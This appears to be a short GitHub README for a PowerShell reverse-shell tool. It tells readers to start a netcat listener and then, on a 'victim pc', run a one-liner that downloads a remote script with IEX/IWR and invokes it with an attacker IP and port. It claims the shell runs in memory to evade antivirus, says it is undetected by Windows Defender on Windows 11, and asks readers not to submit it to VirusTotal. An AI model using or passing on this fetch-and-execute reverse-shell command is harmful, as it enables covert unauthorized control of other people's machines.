<img src="https://img.shields.io/badge/PowerShell-%E2%89%A5%20v3.0-blue">

# INSTRUCTIONS : - 
<br>
1.) Run [nc -nlvp 'port'] on your terminal to start up a listener.
<br>
2.) Open powershell on the victim pc and type <br> 
IEX (IWR 'https://raw.githubusercontent.com/anonymous300502/powershell_payload/main/test.ps1' -UseBasicParsing) | Invoke-DopeShell "IP" "PORT" 

## This will spawn a interactive shell with the target pc and run in memory to evade AV 
### Currently undetectable by the latest updated version of windows defender on Win 11 ( last tested on 17:00 IST June 13th 2024) 

Please dont upload the script on virus total :) 
